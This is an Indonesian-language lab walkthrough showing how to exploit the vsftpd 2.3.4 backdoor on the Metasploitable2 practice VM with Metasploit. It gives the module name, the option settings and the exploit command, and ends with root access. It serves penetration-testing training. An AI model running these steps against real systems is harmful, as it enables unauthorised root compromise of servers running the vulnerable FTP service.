# Exploit Port 21 (FTP)
- Buka msfconsole di terminal
```sh
msfconsole
```

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20FTP/ftp%201.JPG)

- Cari modul untuk exploit `vsftpd 2.3.4`
```sh
search vsftpd 2.3.4
```

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20FTP/ftp%202.JPG)

- Gunakan modul `exploit/unix/ftp/vsftpd_234_backdoor` untuk exploit `vsftpd 2.3.4`
```sh
use exploit/unix/ftp/vsftpd_234_backdoor
```

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20FTP/ftp%203.JPG)

- Tampilkan daftar parameter yang dibutuhkan di modul tersebut. Disini hanya terdapat 2 parameter yaitu `RHOSTS` dan `RPORT` yang secara default terisi 21
```sh
show options
```

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20FTP/ftp%204.JPG)

- Isi parameter `RHOST` dengan IP metasploitable2
```sh
set RHOST <IP_metasploitable2>
```

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20FTP/ftp%205.JPG)

- Jalankan modul exploit
```sh
exploit
```

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20FTP/ftp%206.JPG)

- Setelah payload berhasil dijalankan di dapat akses root

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20FTP/ftp%207.JPG)